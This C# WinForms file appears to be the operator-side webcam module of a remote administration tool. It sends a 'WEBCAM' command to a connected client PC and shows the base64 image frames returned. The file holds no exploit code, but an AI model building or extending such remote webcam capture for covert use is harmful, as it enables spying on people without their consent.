// Dosya: Modules/CamForm.cs
//using App.Service.Modules;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace App.Service
{
    public class CamForm : ModuleForm, IRemoteModule
    {
        PictureBox _pic;
        Label _status;
        Action<string> _send;

        public CamForm() : base("Webcam")
        {
            _pic = new PictureBox { Dock = DockStyle.Fill, SizeMode = PictureBoxSizeMode.Zoom, BackColor = Color.Black };
            Ui.Buffered(_pic);
            _status = new Label
            {
                Dock = DockStyle.Top,
                Height = S(26),
                TextAlign = ContentAlignment.MiddleCenter,
                ForeColor = Theme.Current.Ok,
                BackColor = Theme.Current.Title,
                Text = "Kare bekleniyor..."
            };

            var bar = new BufferedPanel { Dock = DockStyle.Bottom, Height = S(44), BackColor = Theme.Current.Side, Padding = new Padding(S(8)), Tag = "side" };
            var shot = new PillButton { Text = "Yeniden Çek", Dock = DockStyle.Left, Width = S(120), Radius = 7 };
            shot.Palette(Theme.Current.Accent, Color.White);
            shot.Click += (s, e) => { _status.Text = "Çekiliyor..."; if (_send != null) _send("WEBCAM"); };
            bar.Controls.Add(shot);

            Body.Controls.Add(_pic);
            Body.Controls.Add(_status);
            Body.Controls.Add(bar);
        }

        public void Initialize(ClientSession s, Action<string> send)
        {
            _send = send;
            Title.Text = "Webcam - " + s.UserPc;
            Shown += (e, a) => { if (_send != null) _send("WEBCAM"); };
        }

        public void SetStatus(string text) { if (!IsDisposed && _status != null) _status.Text = text; }

        public void UpdateImage(string b64)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { UpdateImage(b64); }); } catch { } return; }
            try
            {
                Image img;
                using (var ms = new MemoryStream(Convert.FromBase64String(b64))) img = Image.FromStream(ms);
                var copy = new Bitmap(img);
                img.Dispose();
                var old = _pic.Image;
                _pic.Image = copy;
                if (old != null) old.Dispose();
                _status.Text = "Kare alındı - " + DateTime.Now.ToString("HH:mm:ss");
            }
            catch { }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && _pic != null && _pic.Image != null) { _pic.Image.Dispose(); _pic.Image = null; }
            base.Dispose(disposing);
        }
    }
}